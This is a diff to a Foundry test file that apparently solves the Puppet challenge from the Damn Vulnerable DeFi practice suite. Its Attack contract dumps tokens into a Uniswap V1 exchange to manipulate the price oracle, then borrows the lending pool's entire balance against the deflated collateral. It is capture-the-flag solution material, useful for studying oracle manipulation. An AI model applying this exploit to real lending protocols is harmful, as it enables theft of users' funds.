@@ -15,6 +15,9 @@ contract ProofsOfConcept is Test {
     address _user = makeAddr("user");
     address _attacker = makeAddr("attacker");
 
+    uint256 constant ATTACKER_TOKENS = 1000 ether;
+    uint256 constant ATTACKER_ETH = 25 ether;
+
     Deployer _deployer;
 
     DamnValuableToken _token;
@@ -51,19 +54,20 @@ contract ProofsOfConcept is Test {
 
     function testAttack() external {
         // Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.
-        vm.deal(_attacker, 25 ether);
-        deal(address(_token), _attacker, 1000);
+        vm.deal(_attacker, ATTACKER_ETH);
+        deal(address(_token), _attacker, ATTACKER_TOKENS);
 
-        uint256 poolTokens = _deployer.POOL_TOKENS();
+        uint256 poolTokens = _deployer.POOL_INITIAL_TOKEN_BALANCE();
 
-        assertEq(_token.balanceOf(address(_attacker)), 1000);
+        assertEq(_token.balanceOf(address(_attacker)), ATTACKER_TOKENS);
         assertEq(_token.balanceOf(address(_pool)), poolTokens);
 
         vm.startPrank(_attacker);
-        Attack attack = new Attack(_pool);
-        attack.attack(poolTokens);
+        Attack attack = new Attack(_token, _pool, _exchange);
+        _token.approve(address(attack), ATTACKER_TOKENS);
+        attack.attack{value: ATTACKER_ETH}(poolTokens, ATTACKER_TOKENS);
 
-        assertEq(_token.balanceOf(address(_attacker)), 1000 + poolTokens);
+        assertGt(_token.balanceOf(address(_attacker)), poolTokens);
         assertEq(_token.balanceOf(address(_pool)), 0);
     }
 
@@ -80,14 +84,37 @@ contract ProofsOfConcept is Test {
 }
 
 contract Attack {
+    using Address for address payable;
+
+    DamnValuableToken _token;
     PuppetPool _pool;
+    UniswapV1Exchange _exchange;
 
-    constructor(PuppetPool pool) {
+    constructor(
+        DamnValuableToken token,
+        PuppetPool pool,
+        UniswapV1Exchange exchange
+    ) {
+        _token = token;
         _pool = pool;
+        _exchange = exchange;
     }
 
-    function attack(uint256 amount) external {
+    function attack(uint256 poolTokens, uint256 senderTokens) external payable {
         // deposit all tokens in uniswap, get eth
+        _exchange.tokenToEthSwapInput(
+            senderTokens,
+            0, // min eth
+            block.timestamp + 1 hours
+        );
+
         // borrow all tokens from the pool
+        _pool.borrow{value: address(this).balance}(poolTokens, msg.sender);
+
+        // send everything to sender
+        _token.transfer(msg.sender, _token.balanceOf(address(this)));
+        payable(msg.sender).sendValue(address(this).balance);
     }
+
+    receive() external payable {}
 }
